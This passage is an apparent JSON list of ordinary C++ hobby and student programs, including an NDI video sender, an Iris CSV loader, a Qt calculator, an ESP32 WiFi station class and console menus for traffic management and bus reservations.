std::endl;\n    std::cerr << \"Press Ctrl-C to stop\" << std::endl;\n    std::cerr << \"NDI\u00ae is a registered trademark of Vizrt NDI AB https://ndi.video/\" << std::endl;\n\n    // Send the video frames\n    cv::Mat frame;\n    while (keep_running) {\n        cap.set(cv::CAP_PROP_POS_FRAMES, 0);  // Reset to the first frame\n        while (cap.read(frame) && keep_running) {\n            cv::Mat frameBGRA;\n            cv::cvtColor(frame, frameBGRA, cv::COLOR_BGR2BGRA);\n\n            NDI_video_frame.p_data = frameBGRA.data;\n            NDI_video_frame.line_stride_in_bytes = static_cast<int>(frameBGRA.step);\n\n            // Send the frame\n            NDIlib_send_send_video_v2(pNDI_send, &NDI_video_frame);\n\n            // Add a small delay to maintain the original video frame rate\n            cv::waitKey(1000 / static_cast<int>(fps));\n        }\n    }\n\n    // Clean up\n    NDIlib_send_destroy(pNDI_send);\n    NDIlib_destroy();\n\n    return 0;\n}\n",
    "#include \"DataLoader.h\"\n#include <iostream>\n#include <string>\n#include <vector>\n#include <sstream>\n#include <Windows.h>\n#include <wininet.h>\n#include <stdexcept>\n#include <fstream>\n#include <regex>\n#include <cmath>\n#include <algorithm>\n#include <utility>\n#include <map>\n#include <random>\n#include \"../DataUtils/DataPreprocessor.h\"\n#include <Windows.h> // For MessageBox\n#include <string>     \nusing namespace System::Windows::Forms; // For MessageBox\n\n//#pragma comment(lib, \"wininet\")\n\nvoid DataLoader::loadAndPreprocessDataset(const std::string& file_path,\n    std::vector<std::vector<double>>& dataset) {\n    std::ifstream data_stream(file_path); // Open the file stream to read data from the file\n    std::string data_string((std::istreambuf_iterator<char>(data_stream)),\n        std::istreambuf_iterator<char>()); // Read the entire file into a string\n\n    std::istringstream iss(data_string); // Create a string stream to read data line by line\n    std::string line; // Variable to store each line of data\n    DataPreprocessor preprocessor; // Instance of a data preprocessor class\n\n    bool first_line = true; // Flag to indicate if it's the first line of data\n\n    while (std::getline(iss, line)) { // Read each line from the string stream\n        if (first_line) { // Skip the first line (header)\n            first_line = false;\n            continue;\n        }\n        std::stringstream ss(line); // Create a string stream to read data from each line\n        std::string token; // Variable to store each token (data value) in the line\n        std::vector<double> row; // Vector to store the values in a row (feature vector)\n\n        int col_num = 1; // Counter for column number\n\n        while (std::getline(ss, token, ',')) { // Read each token (data value) separated by commas\n            if (col_num >= 2 && col_num <= 5) { // Check if the token belongs to columns 2, 3, 4, or 5 (feature vector)\n                double value = preprocessor.safeStod(token); // Convert token to double using data preprocessor's safe_stod() function\n                row.push_back(value); // Add the converted value to the feature vector row\n            }\n            else if (col_num == 6) { // The token belongs to column 6 (class label)\n                if (token == \"Iris-setosa\") { // Check if the class label is \"Iris-setosa\"\n                    row.push_back(1); // Add numerical value 1 to the feature vector row\n                }\n                else if (token == \"Iris-versicolor\") { // Check if the class label is \"Iris-versicolor\"\n                    row.push_back(2); // Add numerical value 2 to the feature vector row\n                }\n                else if (token == \"Iris-virginica\") { // Check if the class label is \"Iris-virginica\"\n                    row.push_back(3); // Add numerical value 3 to the feature vector row\n                }\n            }\n            col_num++; // Increment the column number counter\n        }\n        dataset.push_back(row); // Add the feature vector row to the dataset (including X and y)\n    }\n}\n\n\n\n//// Function to read and parse the dataset file, removing special characters\nstd::vector<std::vector<std::string>> DataLoader::readDatasetFromFilePath(const std::string& filePath)\n{\n    if (filePath.empty()) {\n        MessageBox::Show(\"Please browse and select the dataset file from your PC.\");\n        return {}; // Return an empty vector since there's no valid file path\n    }\n\n    std::ifstream file(filePath);\n    std::vector<std::vector<std::string>> data;\n\n    if (!file.is_open()) {\n        MessageBox::Show(\"Failed to open the dataset file: \");\n        return {}; // Return an empty vector since file couldn't be opened\n    }\n\n    std::string line;\n\n    while (std::getline(file, line))\n    {\n\n        std::stringstream ss(line);\n        std::string token;\n        std::vector<std::string> row;\n\n        while (std::getline(ss, token, ','))\n        {\n            // Remove double quotes from the token if present\n            if (!token.empty() && token.front() == '\"' && token.back() == '\"')\n            {\n                token = token.substr(1, token.length() - 2);\n            }\n\n            row.push_back(token);\n        }\n\n        data.push_back(row);\n    }\n\n    file.close();\n\n    if (data.empty()) {\n        MessageBox::Show(\"The dataset file is empty or does not contain valid data.\");\n    }\n\n    return data;\n}\n\n\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n#include \"mergesort.h\"  // \n\n// Funci\u00f3n para leer los datos desde un archivo CSV\nstd::vector<Transaccion> leerDatos(const std::string& nombreArchivo) {\n    std::vector<Transaccion> transacciones;\n    std::ifstream archivo(nombreArchivo);\n    std::string linea;\n\n    while (std::getline(archivo, linea)) {\n        Transaccion t;\n        size_t pos = 0;\n\n        pos = linea.find(\",\");\n        t.monto = std::stod(linea.substr(0, pos));  // Convertir el primer valor a double (monto)\n        linea.erase(0, pos + 1);\n\n        pos = linea.find(\",\");\n        t.categoria = linea.substr(0, pos);  // Segundo valor es la categor\u00eda\n        linea.erase(0, pos + 1);\n\n        pos = linea.find(\",\");\n        t.tipo = linea.substr(0, pos);  // Tercer valor es el tipo (ingreso/gasto)\n        linea.erase(0, pos + 1);\n\n        t.fecha = linea;  // Cuarto valor es la fecha\n\n        transacciones.push_back(t);\n    }\n\n    archivo.close();\n    return transacciones;\n}\n\n// Funci\u00f3n para imprimir la lista de transacciones\nvoid imprimirTransacciones(const std::vector<Transaccion>& transacciones) {\n    for (const auto& t : transacciones) {\n        std::cout << t.tipo << \" - \" << t.categoria << \" - $\" << t.monto << \" - Fecha: \" << t.fecha << std::endl;\n    }\n}\n\nint main() {\n    std::string nombreArchivo = \"transacciones.txt\";  // Archivo con datos de ingresos y gastos\n    std::vector<Transaccion> transacciones = leerDatos(nombreArchivo);\n\n    std::cout << \"Transacciones antes de ordenar:\\n\";\n    imprimirTransacciones(transacciones);\n\n    // Ordenar las transacciones usando Merge Sort\n    mergeSort(transacciones, 0, transacciones.size() - 1);\n\n    std::cout << \"\\nTransacciones despu\u00e9s de ordenar:\\n\";\n    imprimirTransacciones(transacciones);\n\n    return 0;\n}\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <iostream>\n\nMainWindow::MainWindow(QWidget *parent)\n  : QMainWindow(parent)\n  , ui(new Ui::MainWindow)\n{\n  ui->setupUi(this);\n\n  connect(ui->Bzero,  SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bone,   SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Btwo,   SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bthree, SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bfour,  SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bfive,  SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bsix,   SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bseven, SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Beight, SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bnine,  SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bx,     SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n\n  connect(ui->Badd,   SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bsub,   SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bmul,   SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bdiv,   SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bpow,   SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n  connect(ui->Bmod,   SIGNAL(clicked()), this, SLOT(digit_and_oper()));\n\n  connect(ui->Bln,    SIGNAL(clicked()), this, SLOT(func()));\n  connect(ui->Bsin,   SIGNAL(clicked()), this, SLOT(func()));\n  connect(ui->Bcos,   SIGNAL(clicked()), this, SLOT(func()));\n  connect(ui->Btan,   SIGNAL(clicked()), this, SLOT(func()));\n  connect(ui->Blog,   SIGNAL(clicked()), this, SLOT(func()));\n  connect(ui->Basin,  SIGNAL(clicked()), this, SLOT(func()));\n  connect(ui->Bacos,  SIGNAL(clicked()), this, SLOT(func()));\n  connect(ui->Batan,  SIGNAL(clicked()), this, SLOT(func()));\n  connect(ui->Bsqrt,  SIGNAL(clicked()), this, SLOT(func()));\n\n  connect(ui->Beq,    SIGNAL(clicked()), this, SLOT(Beq_clicked()));\n  connect(ui->Bac,    SIGNAL(clicked()), this, SLOT(Bac_clicked()));\n  connect(ui->Bdot,   SIGNAL(clicked()), this, SLOT(Bdot_clicked()));\n  connect(ui->Bdel,   SIGNAL(clicked()), this, SLOT(Bdel_clicked()));\n  connect(ui->Bclbr,  SIGNAL(clicked()), this, SLOT(Bclbr_clicked()));\n  connect(ui->Bopbr,  SIGNAL(clicked()), this, SLOT(Bopbr_clicked()));\n\n\n  connect(ui->Bset_axis,    SIGNAL(clicked()), this, SLOT(set_axis()));\n  connect(ui->Bdraw_graph,  SIGNAL(clicked()), this, SLOT(draw_graph()));\n}\n\nMainWindow::~MainWindow()\n{\n  delete ui;\n}\n\nvoid MainWindow::digit_and_oper()\n{\n  QPushButton *button = (QPushButton *)sender();\n  if (ui->label->text().contains(\"Wrong\") || ui->label->text().contains(\"Err\") || ui->label->text().contains(\"nan\")) {\n    ui->label->setText(\"\");\n  }\n  ui->label->setText(ui->label->text() + button->text());\n}\n\n\nvoid MainWindow::func()\n{\n  QPushButton *button = (QPushButton *)sender();\n  if (ui->label->text().contains(\"Wrong\") || ui->label->text().contains(\"Err\") || ui->label->text().contains(\"nan\")) {\n    ui->label->setText(\"\");\n  }\n  ui->label->setText(ui->label->text() + button->text() + \"(\");\n}\n\n\nvoid MainWindow::Bdot_clicked()\n{\n  ui->label->setText(ui->label->text() + \".\");\n}\n\n\nvoid MainWindow::Bac_clicked()\n{\n  ui->label->setText(\"\");\n  on_Bgraphclear_clicked();\n}\n\nvoid MainWindow::Beq_clicked()\n{\n  QString input_string = ui->label->text();\n  QByteArray b_str = input_string.toLocal8Bit();\n  char *input_str = b_str.data();\n  if (is_correct(input_str) || input_string.contains(\"Wrong expression\")) {\n    error();\n  } else {\n    if (ui->label->text().contains(\"x\")) {\n      draw_graph();\n    } else {\n      Data res = Begin(input_str);\n      if (IsError(res)) {\n        ui->label->clear();\n        ui->label->setText(ui->label->text() + \"Error\");\n      } else {\n        ui->label->setText(QString::number(res.value, 'f', 6));\n      }\n    }\n  }\n}\n\nvoid MainWindow::error() {\n    ui->label->clear();\n    ui->label->setText(\"Wrong expression\");\n}\n\nvoid MainWindow::Bclbr_clicked()\n{\n  if (ui->label->text().contains(\"Wrong\") || ui->label->text().contains(\"Err\") || ui->label->text().contains(\"nan\")) {\n    ui->label->setText(\"\");\n  }\n    ui->label->setText(ui->label->text() + \")\");\n}\n\nvoid MainWindow::Bopbr_clicked()\n{\n  if (ui->label->text().contains(\"Wrong\") || ui->label->text().contains(\"Err\") || ui->label->text().contains(\"nan\")) {\n    ui->label->setText(\"\");\n  }\n    ui->label->setText(ui->label->text() + \"(\");\n}\n\nvoid MainWindow::Bdel_clicked()\n{\n  QString new_label = ui->label->text();\n  new_label.chop(1);\n  ui->label->setText(new_label);\n}\n\nvoid MainWindow::draw_graph() {\n  QVector<double> x(1000), y(1000);\n  QString input_string = ui->label->text();\n  double x_min = ui->xmin_spinbox->value();\n  double x_max = ui->xmax_spinbox->value();\n  double x_array[1000] = {0};\n  double y_array[1000] = {0};\n\n  for (int i = 0; i < 1000; i++) {\n    x_array[i] = x_min + i * (x_max - x_min) / 1000;\n    x[i] ",
    "/*!\r\n    \\file\r\n    \\brief \u041a\u043b\u0430\u0441\u0441 \u0434\u043b\u044f \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f \u043a WiFi \u0440\u043e\u0443\u0442\u0435\u0440\u0443.\r\n    \\authors \u0411\u043b\u0438\u0437\u043d\u0435\u0446 \u0420.\u0410. (r.bliznets@gmail.com)\r\n    \\version 0.0.0.1\r\n    \\date 10.09.2024\r\n*/\r\n\r\n#include \"WiFiStation.h\"\r\n#include \"esp_log.h\"\r\n#include <arpa/inet.h>\r\n#include \"tasks/CUDPOut.h\"\r\n#include \"tasks/CUDPInTask.h\"\r\n#include \"tasks/CTCPClientTask.h\"\r\n#include \"CTrace.h\"\r\n#include \"esp_netif_sntp.h\"\r\n#include \"esp_sntp.h\"\r\n#include \"CDateTimeSystem.h\"\r\n\r\nstatic const char *TAG = \"wifi\";\r\n\r\nWiFiStation *WiFiStation::theSingleInstance = nullptr;\r\n\r\nWiFiStation::WiFiStation()\r\n{\r\n    std::memset(&m_wifi_config, 0, sizeof(m_wifi_config));\r\n    m_wifi_config.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;\r\n}\r\n\r\nWiFiStation::~WiFiStation()\r\n{\r\n    stop();\r\n}\r\n\r\nvoid WiFiStation::event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data)\r\n{\r\n    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START)\r\n    {\r\n        esp_wifi_connect();\r\n    }\r\n    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED)\r\n    {\r\n        if (WiFiStation::Instance()->mSrcIP != 0)\r\n        {\r\n            WiFiStation::Instance()->mSrcIP = 0;\r\n            if (WiFiStation::Instance()->mConnectCallback != nullptr)\r\n                WiFiStation::Instance()->mConnectCallback(nullptr);\r\n        }\r\n        if(WiFiStation::Instance()->mConnecting)\r\n        {\r\n            esp_wifi_connect();\r\n            ESP_LOGW(TAG, \"connect to the AP fail\");\r\n        }\r\n    }\r\n    else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP)\r\n    {\r\n        ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;\r\n        // ESP_LOGI(TAG, \"got ip:\" IPSTR, IP2STR(&event->ip_info.ip));\r\n        WiFiStation::Instance()->mSrcIP = event->ip_info.ip.addr;\r\n#if (CONFIG_WIFICHN_SYNC_TIME == 1)\r\n#if (CONFIG_LWIP_DHCP_GET_NTP_SRV == 1)\r\n        esp_netif_sntp_start();\r\n#else\r\n        WiFiStation::Instance()->syncTime();\r\n#endif\r\n#endif\r\n        if (WiFiStation::Instance()->mConnectCallback != nullptr)\r\n            WiFiStation::Instance()->mConnectCallback(&event->ip_info.ip.addr);\r\n    }\r\n}\r\n\r\nbool WiFiStation::start(onWiFiConnect *connectCallback)\r\n{\r\n    if (mConnecting)\r\n        return false;\r\n    mConnectCallback = connectCallback;\r\n\r\n    // ESP_LOGI(TAG,\"%s %s\",m_wifi_config.sta.ssid, m_wifi_config.sta.password);\r\n\r\n    ESP_ERROR_CHECK(esp_netif_init());\r\n    ESP_ERROR_CHECK(esp_event_loop_create_default());\r\n#if (CONFIG_WIFICHN_SYNC_TIME == 1) && (CONFIG_LWIP_DHCP_GET_NTP_SRV == 1)\r\n    if (!CDateTimeSystem::isSync())\r\n    {\r\n        mStartSyncTime = true;\r\n        esp_sntp_config_t config = ESP_NETIF_SNTP_DEFAULT_CONFIG(\"pool.ntp.org\");\r\n        config.start = false;                     // start SNTP service explicitly (after connecting)\r\n        config.server_from_dhcp = true;           // accept NTP offers from DHCP server, if any (need to enable *before* connecting)\r\n        config.renew_servers_after_new_IP = true; // let esp-netif update configured SNTP server(s) after receiving DHCP lease\r\n        config.index_of_first_server = 1;         // updates from server num 1, leaving server 0 (from DHCP) intact\r\n        config.ip_event_to_renew = IP_EVENT_STA_GOT_IP;\r\n        config.sync_cb = time_sync_notification_cb; // only if we need the notification function\r\n        esp_netif_sntp_init(&config);\r\n    }\r\n#endif\r\n    m_net_if = esp_netif_create_default_wifi_sta();\r\n    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();\r\n    ESP_ERROR_CHECK(esp_wifi_init(&cfg));\r\n    esp_event_handler_instance_t instance_any_id;\r\n    esp_event_handler_instance_t instance_got_ip;\r\n    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,\r\n                                                        ESP_EVENT_ANY_ID,\r\n                                                        &event_handler,\r\n                                                        nullptr,\r\n                                                        &instance_any_id));\r\n    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,\r\n                                                        IP_EVENT_STA_GOT_IP,\r\n                                                        &event_handler,\r\n                                                        nullptr,\r\n                                                        &instance_got_ip));\r\n\r\n    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));\r\n    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &m_wifi_config));\r\n    mConnecting = true;\r\n    ESP_ERROR_CHECK(esp_wifi_start());\r\n    // ESP_LOGI(TAG, \"wifi_init_sta finished.\");\r\n    return true;\r\n}\r\n\r\nbool WiFiStation::stop()\r\n{\r\n    stopClient();\r\n    mConnecting = false;\r\n    vTaskDelay(pdMS_TO_TICKS(100));\r\n    esp_wifi_stop();\r\n    while (mSrcIP != 0)\r\n        vTaskDelay(1);\r\n    esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, &event_handler);\r\n    esp_event_handler_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, &event_handler);\r\n    esp_wifi_deinit();\r\n    esp_netif_destr",
    "#include<bits/stdc++.h>\n#include <fstream>\n#include <chrono> //for delay\n#include <stdlib.h>\n#include<ctime>\n\n\n// ***** Smart Traffic Management Solution *****\n\n//keep the record of vehicles                      == recOfVeh()\n//keep the record of challan done                  == recOfChall()\n//Search the record of vehicles                    == vehSearch()\n//Display information of traffic in control booths == trafContBooth()\n//Helpline Information and nearby hospitals        == helpInfo()\n//control the traffic                              == trafCont()\n\n\nusing namespace std;\n\n\nclass SmartTrafficManagementSystem{\n\n\npublic:\n    \n    int welcome()\n    {\n        system(\"clear\");\n\n        time_t tt;\n        struct tm * ti;\n        time (&tt);\n        ti = localtime(&tt);\n\n        cout<<endl<<endl<<endl<<endl<<endl<<endl<<endl<<endl<<endl<<\"                                                     \" <<asctime(ti);\n        delay1();\n\n        system(\"clear\");\n\n        cout<<\">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\"<<endl;\n        cout<<\">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                                                          WELCOME TO                                                             '**\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                                                SMART TRAFFIC MANAGEMENT SYSTEM                                                  '**\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                   Press Your Option :-                                                                                          '**\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                                    1.Record of Vehicles                                                                         '**\"<<endl;\n        cout<<\"**'                                    2.Record of Challan                                                                          '**\"<<endl;\n        cout<<\"**'                                    3.Search the Record of Vehicles                                                              '**\"<<endl;\n        cout<<\"**'                                    4.Traffic Control Booths                                                                     '**\"<<endl;\n        cout<<\"**'                                    5.Control the Traffic                                                                        '**\"<<endl;\n        cout<<\"**'                                    6.Help !                                                                                     '**\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                   Enter your choice __                                                                                          '**\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                                                                                                                                 '**\"<<endl;\n        cout<<\"**'                                             ",
    "\r\n#include <conio.h>\r\n#include <cstdio>\r\n#include <iostream>\r\n#include <string.h>\r\n#include <cstdlib>\r\n\r\nusing namespace std;\r\nstatic int p = 0;\r\nclass a\r\n\r\n{\r\n  char busn[5], driver[10], arrival[5], depart[5], from[10], to[10], seat[8][4][10];\r\n\r\npublic:\r\n\r\n  void install();\r\n\r\n  void allotment();\r\n\r\n  void empty();\r\n\r\n  void show();\r\n\r\n  void avail();\r\n\r\n  void position(int i);\r\n\r\n}\r\n\r\nbus[10];\r\nvoid vline(char ch)\r\n{\r\n  for (int i=80;i>0;i--)\r\n  cout<<ch;\r\n}\r\nvoid a::install()\r\n{\r\n\r\n  cout<<\"\\n\\n\\n\\t\\t\\tEnter bus no: \";\r\n\r\n  cin>>bus[p].busn;\r\n\r\n  cout<<\"\\n\\t\\t\\tEnter Driver's name: \";\r\n\r\n  cin>>bus[p].driver;\r\n\r\n  cout<<\"\\n\\t\\t\\tArrival time: \";\r\n\r\n  cin>>bus[p].arrival;\r\n\r\n  cout<<\"\\n\\t\\t\\tDeparture: \";\r\n\r\n  cin>>bus[p].depart;\r\n\r\n  cout<<\"\\n\\t\\t\\tFrom: \";\r\n\r\n  cin>>bus[p].from;\r\n\r\n  cout<<\"\\n\\t\\t\\tTo: \";\r\n\r\n  cin>>bus[p].to;\r\n\r\n  bus[p].empty();\r\n\r\n  p++;\r\n  \r\n  cout<<\"\\n\\t\\t\\tBus added Sucessfully \";\r\n\r\n}\r\n\r\nvoid a::allotment()\r\n\r\n{\r\n\r\n  int seat;\r\n\r\n  char number[5];\r\n\r\n  top:\r\n\r\n  cout<<\"\\n\\n\\n\\t\\t\\tBus no: \";\r\n\r\n  cin>>number;\r\n\r\n  int n;\r\n\r\n  for(n=0;n<=p;n++)\r\n\r\n  {\r\n\r\n    if(strcmp(bus[n].busn, number)==0)\r\n\r\n    break;\r\n\r\n  }\r\n\r\n  while(n<=p)\r\n\r\n  {\r\n\r\n    cout<<\"\\n\\t\\t\\tSeat Number: \";\r\n\r\n    cin>>seat;\r\n\r\n    if(seat>32)\r\n\r\n    {\r\n\r\n      cout<<\"\\n\\t\\t\\tThere are only 32 seats available in this bus.\";\r\n\r\n    }\r\n\r\n    else\r\n\r\n    {\r\n\r\n    if (strcmp(bus[n].seat[seat/4][(seat%4)-1], \"Empty\")==0)\r\n\r\n      {\r\n\r\n        cout<<\"\\t\\t\\tEnter passanger's name: \";\r\n\r\n        cin>>bus[n].seat[seat/4][(seat%4)-1];\r\n        \r\n        cout<<\"\\t\\t\\tSeat Reserved Sucessfully \";\r\n\r\n        break;\r\n\r\n      }\r\n\r\n    else\r\n\r\n      cout<<\"\\t\\t\\tThe seat no. is already reserved.\\n\";\r\n\r\n      }\r\n\r\n      }\r\n\r\n    if(n>p)\r\n\r\n    {\r\n\r\n      cout<<\"\\t\\t\\tEnter correct bus no.\\n\";\r\n\r\n      goto top;\r\n\r\n    }\r\n\r\n  }\r\n\r\n\r\nvoid a::empty()\r\n\r\n{\r\n\r\n  for(int i=0; i<8;i++)\r\n\r\n  {\r\n\r\n    for(int j=0;j<4;j++)\r\n\r\n    {\r\n\r\n      strcpy(bus[p].seat[i][j], \"Empty\");\r\n\r\n    }\r\n\r\n  }\r\n\r\n}\r\n\r\nvoid a::show()\r\n\r\n{\r\n\r\n  int n;\r\n\r\n  char number[5];\r\n\r\n  cout<<\"\\t\\t\\tEnter bus no: \";\r\n\r\n  cin>>number;\r\n\r\n  for(n=0;n<=p;n++)\r\n\r\n  {\r\n\r\n    if(strcmp(bus[n].busn, number)==0)\r\n\r\n    break;\r\n\r\n  }\r\n\r\nwhile(n<=p)\r\n\r\n{\r\n\r\n  vline('*');\r\n\r\n  cout<<\"\\t\\t\\tBus no: \\t\"<<bus[n].busn\r\n\r\n  <<\"\\n\\t\\t\\tDriver: \\t\"<<bus[n].driver<<\"\\t\\tArrival time: \\t\"\r\n\r\n  <<bus[n].arrival<<\"\\t\\t\\tDeparture time:\"<<bus[n].depart\r\n\r\n  <<\"\\n\\t\\t\\tFrom: \\t\\t\"<<bus[n].from<<\"\\t\\tTo: \\t\\t\"<<\r\n\r\n  bus[n].to<<\"\\n\";\r\n\r\n  vline('*');\r\n\r\n  bus[0].position(n);\r\n\r\n  int a=1;\r\n\r\n  for (int i=0; i<8; i++)\r\n\r\n  {\r\n\r\n    for(int j=0;j<4;j++)\r\n\r\n    {\r\n\r\n      a++;\r\n\r\n      if(strcmp(bus[n].seat[i][j],\"Empty\")!=0)\r\n\r\n      cout<<\"\\n\\t\\t\\tThe seat no \"<<(a-1)<<\" is reserved for \"<<bus[n].seat[i][j]<<\".\";\r\n\r\n    }\r\n\r\n  }\r\n\r\n  break;\r\n\r\n  }\r\n\r\n  if(n>p)\r\n\r\n    cout<<\"\\t\\t\\tEnter correct bus no: \";\r\n\r\n}\r\n\r\nvoid a::position(int l)\r\n\r\n{\r\n\r\n  int s=0;p=0;\r\n\r\n  for (int i =0; i<8;i++)\r\n\r\n  {\r\n\r\n    cout<<\"\\n\";\r\n\r\n    for (int j = 0;j<4; j++)\r\n\r\n    {\r\n\r\n      s++;\r\n\r\n      if(strcmp(bus[l].seat[i][j], \"Empty\")==0)\r\n\r\n        {\r\n\r\n          cout.width(5);\r\n\r\n          cout.fill(' ');\r\n\r\n          cout<<s<<\".\";\r\n\r\n          cout.width(10);\r\n\r\n          cout.fill(' ');\r\n\r\n          cout<<bus[l].seat[i][j];\r\n\r\n          p++;\r\n\r\n        }\r\n\r\n        else\r\n\r\n        {\r\n\r\n        cout.width(5);\r\n\r\n        cout.fill(' ');\r\n\r\n        cout<<s<<\".\";\r\n\r\n        cout.width(10);\r\n\r\n        cout.fill(' ');\r\n\r\n        cout<<bus[l].seat[i][j];\r\n\r\n        }\r\n\r\n      }\r\n\r\n    }\r\n\r\n  cout<<\"\\n\\n\\t\\t\\tThere are \"<<p<<\" seats empty in Bus No: \"<<bus[l].busn;\r\n\r\n  }\r\n\r\nvoid a::avail()\r\n\r\n{\r\n\r\n\r\n  for(int n=0;n<p;n++)\r\n\r\n  {\r\n\r\n    vline('*');\r\n\r\n    cout<<\"\\t\\t\\tBus no: \\t\"<<bus[n].busn<<\"\\n\\t\\t\\tDriver: \\t\"<<bus[n].driver\r\n\r\n    <<\"\\t\\t\\tArrival time: \\t\"<<bus[n].arrival<<\"\\t\\t\\tDeparture Time: \\t\"\r\n\r\n    <<bus[n].depart<<\"\\n\\t\\t\\tFrom: \\t\\t\"<<bus[n].from<<\"\\t\\tTo: \\t\\t\\t\"\r\n\r\n    <<bus[n].to<<\"\\n\";\r\n\r\n    vline('*');\r\n\r\n    vline('_');\r\n\r\n  }\r\n\r\n}\r\n\r\nint main()\r\n\r\n{\r\n\r\nsystem(\"cls\");\r\n\r\nint w;\r\n\r\nwhile(1)\r\n\r\n{\r\n\r\n\r\n  cout<<\"\\n\\n\\n\\n\\n\";\r\n  \r\n  cout<<\"\\t\\t\\tBus Reservation System Project in C++\\n\\n\";\r\n  \r\n\r\n  cout<<\"\\t\\t\\t1.Add Bus\\n\\t\\t\\t\"\r\n\r\n  <<\"2.Bus Reservation\\n\\t\\t\\t\"\r\n\r\n  <<\"3.Show\\n\\t\\t\\t\"\r\n\r\n  <<\"4.Buses Available. \\n\\t\\t\\t\"\r\n\r\n  <<\"5.Exit\";\r\n\r\n  cout<<\"\\n\\t\\t\\tEnter your choice:-> \";\r\n\r\n  cin>>w;\r\n\r\n  switch(w)\r\n\r\n  {\r\n\r\n    case 1:  bus[p].install();\r\n\r\n      break;\r\n\r\n    case 2:  bus[p].allotment();\r\n\r\n      break;\r\n\r\n    case 3:  bus[0].show();\r\n\r\n      break;\r\n\r\n    case 4:  bus[0].avail();\r\n\r\n      break;\r\n\r\n    case 5:  exit(0);\r\n\r\n  }\r\n\r\n}\r\n\r\nreturn 0;\r\n\r\n}\r\n",
    "#include \"pipepair.hpp\"\r\n\r\nPipePair::PipePair(int upperx, int uppery)\r\n{\r\n    this->upperx = upperx;\r\n    this->uppery = uppery;\r\n    this->lowerx = upperx;\r\n    this->lowery = uppery + VERTICAL_SPACE_BETWEEN_PIPES + pipe_height;\r\n    oldUpperx = this->upperx;\r\n    oldUppery = this->uppery;\r\n    oldLowerx = this->lowerx;\r\n    oldLowery = this->lowery;\r\n    originalUpperx = this->upperx;\r\n\r\n    //Create the sprites that will hold the background.\r\n    behindUpper = gfx_MallocSprite(pipe_width, LCD_HEIGHT + uppery);\r\n    behindLower = gfx_MallocSprite(pipe_width, LCD_HEIGHT - lowery);\r\n\r\n    //Assign the sprites.\r\n    gfx_GetSprite(behindUpper, upperx, 0);\r\n    gfx_GetSprite(behindLower, lowerx, lowery);\r\n}\r\n\r\nvoid PipePair::PreDraw()\r\n{\r\n    //Get the background behind the pipes' new position.\r\n    gfx_GetSprite(behindUpper, oldUpperx, 0);\r\n    gfx_GetSprite(behindLower, oldLowerx, oldLowery);\r\n}\r\n\r\nvoid PipePair::Draw()\r\n{\r\n    //Draw the sprites.\r\n    gfx_RLETSprite(pipe, upperx, uppery);\r\n    gfx_RLETSprite(pipe_flipped, lowerx, lowery);\r\n}\r\n\r\nvoid PipePair::Cleanup()\r\n{\r\n    //Draw the backgrounds over the sprite.\r\n    gfx_Sprite(behindUpper, oldUpperx, 0);\r\n    gfx_Sprite(behindLower, oldLowerx, oldLowery);\r\n\r\n    //Set the old positions as the current positions.\r\n    oldUpperx = upperx;\r\n    